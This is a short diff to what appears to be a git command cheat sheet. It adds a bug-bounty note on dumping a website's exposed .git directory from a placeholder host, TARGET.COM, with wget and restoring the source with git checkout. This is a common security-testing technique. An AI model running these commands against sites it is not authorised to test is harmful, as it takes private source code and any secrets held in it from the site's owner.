@@ -14,3 +14,11 @@ git remote rm alt
 # push to alt 
 git push alt
 
+# bounty: found .git in a url???
+wget --mirror -I .git TARGET.COM/.git/ 
+cd TARGET.COM/ 
+git status
+git checkout -- .
+  - downloads the remote repo
+  - checks the repo status
+  - restores deleated files
